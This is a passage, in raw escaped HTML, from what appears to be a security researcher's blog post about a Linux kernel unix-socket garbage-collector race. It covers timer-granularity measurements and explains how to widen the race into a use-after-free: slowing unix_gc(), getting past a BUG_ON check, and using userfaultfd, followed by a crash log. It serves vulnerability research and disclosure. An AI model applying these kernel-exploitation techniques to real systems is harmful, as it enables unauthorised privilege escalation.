src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2Y9DapfGb7NRtbz3j0aEQlA4SLZgk1ttbc7rS-0ZPbgerGJlqgk-N_Bna8AfcY8J2HBaHo2VJ0x-AR5n9lvivwdjmzKkITRIcypqYSBkOXB0DpavJ9dURyIfbA0u0D0KUOU1JD2pIH8KW2f8AQffaWluuQayXFq_8bleRLPfLZHmAkeLjFbJXxDVA/s359/image18.png\" border=\"0\" alt=\"A sketch of a histogram of race outcomes where the &amp;quot;too early&amp;quot; outcome drops from 100% probability to 0% probability in multiple discrete steps, and overlapping that, the &amp;quot;too late&amp;quot; outcome goes up from 0% probability to 100% in multiple discrete steps\" style=\"max-height: 750; max-width: 600px;\"title=\"A sketch of a histogram of race outcomes where the &amp;quot;too early&amp;quot; outcome drops from 100% probability to 0% probability in multiple discrete steps, and overlapping that, the &amp;quot;too late&amp;quot; outcome goes up from 0% probability to 100% in multiple discrete steps\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;But what the graphs are showing is more of a smooth, linear transition, like this:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjV2n4po9tRvp9j-aHeINv6S3q7YVcSdHocobXnfLZQnkg8kQqh2wx-Q8-gBX6MNFLgAibZwVoUQwOAX-HDCK3aGCRt8rroQtcmw4Kyl9JNoVJb_ldqhj5sVW7CtlA-HFMyI45HPDYfWJD-ck2NpU2ZFFh35gVzmekcAdtlUv3fGVZ8p_Muec3rMbDJ/s359/image13.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjV2n4po9tRvp9j-aHeINv6S3q7YVcSdHocobXnfLZQnkg8kQqh2wx-Q8-gBX6MNFLgAibZwVoUQwOAX-HDCK3aGCRt8rroQtcmw4Kyl9JNoVJb_ldqhj5sVW7CtlA-HFMyI45HPDYfWJD-ck2NpU2ZFFh35gVzmekcAdtlUv3fGVZ8p_Muec3rMbDJ/s359/image13.png\" border=\"0\" alt=\"A sketch of a histogram of race outcomes where the &amp;quot;too early&amp;quot; outcome&amp;#39;s share linearly drops while the &amp;quot;too late&amp;quot; outcome&amp;#39;s share linearly rises\" style=\"max-height: 750; max-width: 600px;\"title=\"A sketch of a histogram of race outcomes where the &amp;quot;too early&amp;quot; outcome&amp;#39;s share linearly drops while the &amp;quot;too late&amp;quot; outcome&amp;#39;s share linearly rises\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;And that seems to me like there&amp;#39;s still something fundamentally wrong. Sure, if there was a sufficiently large number of discrete events mixed together, the curve would eventually just look like a smooth smear - but it seems unlikely to me that there is such a large number of somewhat-evenly distributed random discrete events. And sure, we do get a small amount of timing inaccuracy from sampling the clock in a spinloop, but that should be bounded to the execution time of that spinloop, and the timing smear is far too big for that.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;So it looks like there is a source of randomness that isn&amp;#39;t a discrete event, but something that introduces a random amount of timing delay within some window. So I became suspicious of the hardware timer. The kernel is using &lt;/span&gt;&lt;span class=\"c4\"&gt;MSR_IA32_TSC_DEADLINE&lt;/span&gt;&lt;span&gt;, and the Intel SDM tells us that that thing is programmed with a TSC value, which makes it look as if the timer has very high granularity. But &lt;/span&gt;&lt;span class=\"c4\"&gt;MSR_IA32_TSC_DEADLINE&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a newer mode of the LAPIC timer, and the older LAPIC timer modes were instead programmed in units of the APIC timer frequency. According to the &lt;/span&gt;&lt;span class=\"c11\"&gt;&lt;a class=\"c121\" href=\"https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.pdf#page=378\"&gt;Intel SDM, Volume 3A&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, section 10.5.4 &amp;quot;APIC Timer&amp;quot;, that is &amp;quot;&lt;/span&gt;&lt;span class=\"c16\"&gt;the processor&amp;rsquo;s bus clock or core crystal clock frequency (when TSC/core crystal clock ratio is enumerated in CPUID leaf 0x15) divided by the value specified in the divide configuration register&lt;/span&gt;&lt;span&gt;&amp;quot;. This frequency is significantly lower than the TSC frequency. So perhaps &lt;/span&gt;&lt;span class=\"c4\"&gt;MSR_IA32_TSC_DEADLINE&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;is actually just a front-end to the same old APIC timer?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;I tried to measure the difference between the programmed TSC value and when execution was actually interrupted (not when the interrupt handler starts running, but when the old execution context is interrupted - you can measure that if the interrupted execution context is just running RDTSC in a loop); that looks as follows:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;/p&gt;\n  \n  \n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHjsv0uh_9jjLz2XaZ-i_TkybjySAwI8b6eQwNIwbayoTxJjdOu2hfPK9pBY4itBx_SY444RMWU9V2zf608IUUC8mO40y2hXVuK1EZwNRhWcntOwjHaHiel0ufzva2Ft9RGq86nDFohpKbamTnuz79vZ4WWJ1cMS0gbA8HUsygjshxfHmsXgIN_19y/s756/image11.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHjsv0uh_9jjLz2XaZ-i_TkybjySAwI8b6eQwNIwbayoTxJjdOu2hfPK9pBY4itBx_SY444RMWU9V2zf608IUUC8mO40y2hXVuK1EZwNRhWcntOwjHaHiel0ufzva2Ft9RGq86nDFohpKbamTnuz79vZ4WWJ1cMS0gbA8HUsygjshxfHmsXgIN_19y/s756/image11.png\" border=\"0\" alt=\"A graph showing noise. Delays from deadline TSC to last successful TSC read before interrupt look essentially random, in the range from around -130 to around 10.\" style=\"max-height: 750; max-width: 600px;\"title=\"A graph showing noise. Delays from deadline TSC to last successful TSC read before interrupt look essentially random, in the range from around -130 to around 10.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;As you can see, the expiry of the hardware timer indeed adds a bunch of noise. The size of the timing difference is also very close to the crystal clock frequency - the TSC/core crystal clock ratio on this machine is 117. So I tried plotting the &lt;/span&gt;&lt;span class=\"c6\"&gt;absolute&lt;/span&gt;&lt;span&gt;&amp;nbsp;TSC values at which execution was interrupted, &lt;/span&gt;&lt;span class=\"c6\"&gt;modulo the TSC / core crystal clock ratio&lt;/span&gt;&lt;span class=\"c1\"&gt;, and got this:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;/p&gt;\n  \n  \n &lt;p class=\"c3\"&gt;&lt;span&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFD8Ox0LairxcMkyQuJrocYf7Cg33_jrE4AuhAPvbfMLm8jY8b_NFN9evyjlLXeLHhkfsji2bFNwE_--csZOKd_daBQJdJwKGbeKzLuRiXhGCze_zFELkzxl3dC69I7i4R9SQWgQG2Gv7QlLwdpAs7HRXNQJfCNB6nHh-_8LFvP03N71uMlw7nWoQB/s543/image9%282%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFD8Ox0LairxcMkyQuJrocYf7Cg33_jrE4AuhAPvbfMLm8jY8b_NFN9evyjlLXeLHhkfsji2bFNwE_--csZOKd_daBQJdJwKGbeKzLuRiXhGCze_zFELkzxl3dC69I7i4R9SQWgQG2Gv7QlLwdpAs7HRXNQJfCNB6nHh-_8LFvP03N71uMlw7nWoQB/s543/image9%282%29.png\" border=\"0\" alt=\"A graph showing a clear grouping around 0, roughly in the range -20 to 10, with some noise scattered over the rest of the graph.\" style=\"max-height: 750; max-width: 600px;\"title=\"A graph showing a clear grouping around 0, roughly in the range -20 to 10, with some noise scattered over the rest of the graph.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;This confirms that &lt;/span&gt;&lt;span class=\"c4\"&gt;MSR_IA32_TSC_DEADLINE&lt;/span&gt;&lt;span&gt;&amp;nbsp;is (apparently) an interface that &lt;/span&gt;&lt;span class=\"c6\"&gt;internally converts the specified TSC value into less granular bus clock / core crystal clock time&lt;/span&gt;&lt;span class=\"c1\"&gt;, at least on some Intel CPUs.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;But there&amp;#39;s still something really weird here: The TSC values at which execution seems to be interrupted were at &lt;/span&gt;&lt;span class=\"c6\"&gt;negative&lt;/span&gt;&lt;span&gt;&amp;nbsp;offsets relative to the programmed expiry time, as if the timeouts were rounded &lt;/span&gt;&lt;span class=\"c6\"&gt;down&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;to the less granular clock, or something along those lines. To get a better idea of how timer interrupts work, I measured on yet another system (an old Haswell CPU) with a patched kernel when execution is interrupted and when the interrupt handler starts executing relative to the programmed expiry time (and also plotted the difference between the two):&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;/p&gt;\n  \n  \n &lt;p class=\"c3\"&gt;&lt;span&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxdpX4IgQCQuV9hIXWbVTSfVhyZ1LaNDfV6NUW0HRri_uI-OrUf0wuUK-SPm1gGO0NsqGPxN5WewnPIJ0FBaF7NSPfL0Nh7MQoGXk3YGgVPP2LwuTUz05Yy7DwKgUkxbQ0vJ5nWB0mlS2rPonc1p3wq11SKtzcpYzP_tnnWb65qW5Q4EGtrhz_7mwC/s928/image17.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxdpX4IgQCQuV9hIXWbVTSfVhyZ1LaNDfV6NUW0HRri_uI-OrUf0wuUK-SPm1gGO0NsqGPxN5WewnPIJ0FBaF7NSPfL0Nh7MQoGXk3YGgVPP2LwuTUz05Yy7DwKgUkxbQ0vJ5nWB0mlS2rPonc1p3wq11SKtzcpYzP_tnnWb65qW5Q4EGtrhz_7mwC/s928/image17.png\" border=\"0\" alt=\"A graph showing that the skid from programmed interrupt time to execution interruption is around -100 to -30 cycles, the skid to interrupt entry is around 360 to 420 cycles, and the time from execution interruption to interrupt entry has much less timing variance and is at around 440 cycles.\" style=\"max-height: 750px; max-width: 600px;\"title=\"A graph showing that the skid from programmed interrupt time to execution interruption is around -100 to -30 cycles, the skid to interrupt entry is around 360 to 420 cycles, and the time from execution interruption to interrupt entry has much less timing variance and is at around 440 cycles.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;So it looks like the CPU starts handling timer interrupts a little bit before the programmed expiry time, but interrupt handler entry takes so long (~450 TSC clock cycles?) that by the time the CPU starts executing the interrupt handler, the timer expiry time has long passed.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Anyway, the important bit for us is that when the CPU interrupts execution due to timer expiry, it&amp;#39;s always at a LAPIC timer edge; and LAPIC timer edges happen when the TSC value is a multiple of the TSC/LAPIC clock ratio. An exploit that doesn&amp;#39;t take that into account and wrongly assumes that &lt;/span&gt;&lt;span class=\"c4\"&gt;MSR_IA32_TSC_DEADLINE&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;has TSC granularity will have its timing smeared by one LAPIC clock period, which can be something like 40ns.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;The ~30% accuracy we could achieve with the existing PoC with the right timing is already not terrible; but if we control for the timer&amp;#39;s weirdness, can we do better?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;The problem is that we are effectively launching the race with two timers that behave differently: One timer based on calling &lt;/span&gt;&lt;span class=\"c4\"&gt;clock_gettime()&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;in a loop (which uses the high-resolution TSC to compute a time), the other a hardware timer based on the lower-resolution LAPIC clock. I see two options to fix this:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c20 lst-kix_94mysn7p9quk-0 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c3 c14 li-bullet-0\"&gt;&lt;span class=\"c1\"&gt;Try to ensure that the second timer is set at the start of a LAPIC clock period - that way, the second timer should hopefully behave exactly like the first (or have an additional fixed offset, but we can compensate for that).&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c3 c14 li-bullet-0\"&gt;&lt;span class=\"c1\"&gt;Shift the first timer&amp;#39;s expiry time down according to the distance from the second timer to the previous LAPIC clock period.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;(One annoyance with this is that while we can grab information on how wall/monotonic time is calculated from TSC from the vvar mapping used by the vDSO, the clock is subject to minuscule additional corrections at every clock tick, which occur every 4ms on standard distro kernels (with &lt;/span&gt;&lt;span class=\"c4\"&gt;CONFIG_HZ=250&lt;/span&gt;&lt;span class=\"c1\"&gt;) as long as any core is running.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;I tried to see whether the timing graph would look nicer if I accounted for this LAPIC clock rounding and also used a custom kernel to cheat and control for possible skid introduced by the absolute-to-relative-and-back conversion of the expiry time (see further up), but that still didn&amp;#39;t help all that much.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c15\" id=\"h.na1zwzioj0fl\"&gt;&lt;span class=\"c8\"&gt;(No) surprise: clock speed matters&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;Something I should&amp;#39;ve thought about way earlier is that of course, clock speed matters. On newer Intel CPUs with P-states, the CPU is normally in control of its own frequency, and dynamically adjusts it as it sees fit; the OS just provides some hints.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Linux has an interface that claims to tell you the &amp;quot;current frequency&amp;quot; of each CPU core in &lt;/span&gt;&lt;span class=\"c4\"&gt;/sys/devices/system/cpu/cpufreq/policy&amp;lt;n&amp;gt;/scaling_cur_freq&lt;/span&gt;&lt;span class=\"c1\"&gt;, but when I tried using that, I got a different &amp;quot;frequency&amp;quot; every time I read that file, which seemed suspicious.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Looking at the implementation, it turns out that the value shown there is calculated in &lt;/span&gt;&lt;span class=\"c4\"&gt;arch_freq_get_on_cpu()&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span&gt;its&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;callees&lt;/span&gt;&lt;span&gt;&amp;nbsp;- the value is calculated on demand when the file is read, with results cached for around 10 milliseconds. The value is determined as the ratio between the deltas of &lt;/span&gt;&lt;span class=\"c4\"&gt;MSR_IA32_APERF&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"c4\"&gt;MSR_IA32_MPERF&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;between the last read and the current one. So if you have some tool that is polling these values every few seconds and wants to show average clock frequency over that time, it&amp;#39;s probably a good way of doing things; but if you actually want the current clock frequency, it&amp;#39;s not a good fit.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;I hacked a helper into my kernel that samples both MSRs twice in quick succession, and that gives much cleaner results. When I measure the clock speeds and timing offsets at which the race succeeds, the result looks like this (showing just two clock speeds; the Y axis is the number of race successes at the clock offset specified on the X axis and the frequency scaling specified by the color):&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;/p&gt;\n  \n  \n &lt;p class=\"c3\"&gt;&lt;span&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgteZAepQr9rN7W0YShZIs3QBtqs-9FAJ9uW2wTTH9PSXSXxRMnCwOr9Ystgmi4EfD8ikHkCF0gHIV6s0A1rnnEAHEkl-7cBgLOgmTeDgep0PDO6ukZa6bzFqxCi48yQ46s5iZqSNvx2Dn05XCyVgYnLtqsuUvgyCeYxSRF_eOg4-xFDa7bWKzUD676/s666/image1%20%281%29%281%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgteZAepQr9rN7W0YShZIs3QBtqs-9FAJ9uW2wTTH9PSXSXxRMnCwOr9Ystgmi4EfD8ikHkCF0gHIV6s0A1rnnEAHEkl-7cBgLOgmTeDgep0PDO6ukZa6bzFqxCi48yQ46s5iZqSNvx2Dn05XCyVgYnLtqsuUvgyCeYxSRF_eOg4-xFDa7bWKzUD676/s666/image1%20%281%29%281%29.png\" border=\"0\" alt=\"A graph showing that the timing of successful race attempts depends on the CPU&amp;#39;s performance setting - at 11/28 performance, most successful race attempts occur around clock offset -1200 (in TSC units), while at 14/28 performance, most successful race attempts occur around clock offset -1000.\" style=\"max-height: 750; max-width: 600px;\"title=\"A graph showing that the timing of successful race attempts depends on the CPU&amp;#39;s performance setting - at 11/28 performance, most successful race attempts occur around clock offset -1200 (in TSC units), while at 14/28 performance, most successful race attempts occur around clock offset -1000.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;So clearly, dynamic frequency scaling has a huge impact on the timing of the race - I guess that&amp;#39;s to be expected, really.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;But even accounting for all this, the graph still looks kind of smooth, so clearly there is still something more that I&amp;#39;m missing - oh well. I decided to stop experimenting with the race&amp;#39;s timing at this point, since I didn&amp;#39;t want to sink too much time into it. (Or perhaps I actually just stopped because I got distracted by newer and shinier things?)&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c15\" id=\"h.ktiklcw2yj2x\"&gt;&lt;span&gt;Causing a UAF&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Anyway, I could probably spend much more time trying to investigate the timing variations (and probably mostly bang my head against a wall because details of execution timing are really difficult to understand in detail, and to understand it completely, it might be necessary to use something like &lt;/span&gt;&lt;span class=\"c11\"&gt;&lt;a class=\"c121\" href=\"https://gamozolabs.github.io/metrology/2019/08/19/sushi_roll.html\"&gt;Gamozo Labs&amp;#39; &amp;quot;Sushi Roll&amp;quot;&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;and then go through every single instruction in detail and compare the observations to the internal architecture of the CPU). Let&amp;#39;s not do that, and get back to how to actually exploit this bug!&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;To turn this bug into memory corruption, we have to abuse that the &lt;/span&gt;&lt;span class=\"c4\"&gt;recvmsg()&lt;/span&gt;&lt;span&gt;&amp;nbsp;path assumes that SKBs on the receive queue are protected from deletion by the socket mutex while the GC actually deletes SKBs from the receive queue without touching the socket mutex. For that purpose, while the unix GC is running, we have to start a &lt;/span&gt;&lt;span class=\"c4\"&gt;recvmsg()&lt;/span&gt;&lt;span&gt;&amp;nbsp;call that looks up the victim SKB, block until the unix GC has freed the SKB, and then let &lt;/span&gt;&lt;span class=\"c4\"&gt;recvmsg()&lt;/span&gt;&lt;span&gt;&amp;nbsp;continue operating on the freed SKB. This is fairly straightforward - while it is a race, we can easily slow down &lt;/span&gt;&lt;span class=\"c4\"&gt;unix_gc()&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;for multiple milliseconds by creating lots of sockets that are not directly referenced from the FD table and have many tiny SKBs queued up - here&amp;#39;s a graph showing the unix GC execution time on my laptop, depending on the number of queued SKBs that the GC has to scan through:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;/p&gt;\n  \n  \n &lt;p class=\"c3\"&gt;&lt;span&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiBiMkb5gF1P8Epsw3zNsmjcesB53u-1TWswpWkW-YPl9vBXPF116eQG2v-wx7Kv7Wvb8fcUCoxU5O6VJ5854OdJWXKoSzPxBvBp0atr1HLiSyB1SqvqBTxba28bREm610sKCoFN7kA2ABwWNcq_vbmkPnH7oKGIwRV8gYcxHQ2JoWPf0eIYmO6y1Rq/s833/image15.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiBiMkb5gF1P8Epsw3zNsmjcesB53u-1TWswpWkW-YPl9vBXPF116eQG2v-wx7Kv7Wvb8fcUCoxU5O6VJ5854OdJWXKoSzPxBvBp0atr1HLiSyB1SqvqBTxba28bREm610sKCoFN7kA2ABwWNcq_vbmkPnH7oKGIwRV8gYcxHQ2JoWPf0eIYmO6y1Rq/s833/image15.png\" border=\"0\" alt=\"A graph showing the time spent per GC run depending on the number of queued SKBs. The relationship is roughly linear.\" style=\"max-height: 750; max-width: 600px;\"title=\"A graph showing the time spent per GC run depending on the number of queued SKBs. The relationship is roughly linear.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;To turn this into a UAF, it&amp;#39;s also necessary to get past the following check near the end of &lt;/span&gt;&lt;span class=\"c4\"&gt;unix_gc()&lt;/span&gt;&lt;span class=\"c1\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;/* All candidates should have been detached by now. */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; BUG_ON(!list_empty(&amp;amp;gc_candidates));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c4\"&gt;gc_candidates&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a list that previously contained all sockets that were deemed to be unreachable by the GC. Then, the GC attempted to free all those sockets by eliminating their mutual references. If we manage to keep a reference to one of the sockets that the GC thought was going away, the GC detects that with the &lt;/span&gt;&lt;span class=\"c4\"&gt;BUG_ON()&lt;/span&gt;&lt;span class=\"c1\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;But we don&amp;#39;t actually need the victim SKB to reference a socket that the GC thinks is going away; in &lt;/span&gt;&lt;span class=\"c4\"&gt;scan_inflight()&lt;/span&gt;&lt;span&gt;, the GC targets any SKB with a socket that is marked &lt;/span&gt;&lt;span class=\"c4\"&gt;UNIX_GC_CANDIDATE&lt;/span&gt;&lt;span&gt;, meaning it just had to be &lt;/span&gt;&lt;span class=\"c6\"&gt;a candidate&lt;/span&gt;&lt;span&gt;&amp;nbsp;for being scanned by the GC. So by making the victim SKB hold a reference to a socket that is not directly referenced from a file descriptor table, but is indirectly referenced by a file descriptor table through another socket, we can ensure that the &lt;/span&gt;&lt;span class=\"c4\"&gt;BUG_ON()&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;won&amp;#39;t trigger.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;I extended &lt;/span&gt;&lt;span class=\"c11\"&gt;&lt;a class=\"c121\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2247#c6\"&gt;my reproducer&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;with this trick and some userfaultfd trickery to make &lt;/span&gt;&lt;span class=\"c4\"&gt;recv()&lt;/span&gt;&lt;span&gt;&amp;nbsp;run with the right timing. Nowadays you don&amp;#39;t necessarily get full access to userfaultfd as a normal user, but since I&amp;#39;m just trying to show the concept, and there are alternatives to userfaultfd&lt;/span&gt;&lt;span&gt;&amp;nbsp;(using FUSE or just slow disk access&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;that&amp;#39;s good enough for this blogpost.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;When a normal distro kernel is running normally, the UAF reproducer&amp;#39;s UAF accesses won&amp;#39;t actually be noticeable; but if you add the kernel command line flag &lt;/span&gt;&lt;span class=\"c4\"&gt;slub_debug=FP&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;(to enable SLUB&amp;#39;s poisoning and sanity checks), the reproducer quickly crashes twice, first with a poison dereference and then a poison overwrite detection, showing that one byte of the poison was incremented:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;general protection fault, probably for non-canonical address 0x6b6b6b6b6b6b6b6b: 0000 [#1] SMP NOPTI&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;CPU: 1 PID: 2655 Comm: hardirq_loop Not tainted 5.10.0-9-amd64 #1 Debian 5.10.70-1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;[...]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;RIP: 0010:unix_stream_read_generic+0x72b/0x870&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;Code: fe ff ff 31 ff e8 85 87 91 ff e9 a5 fe ff ff 45 01 77 44 8b 83 80 01 00 00 85 c0 0f 89 10 01 00 00 49 8b 47 38 48 85 c0 74 23 &amp;lt;0f&amp;gt; bf 00 66 85 c0 0f 85 20 01 00 00 4c 89 fe 48 8d 7c 24 58 44 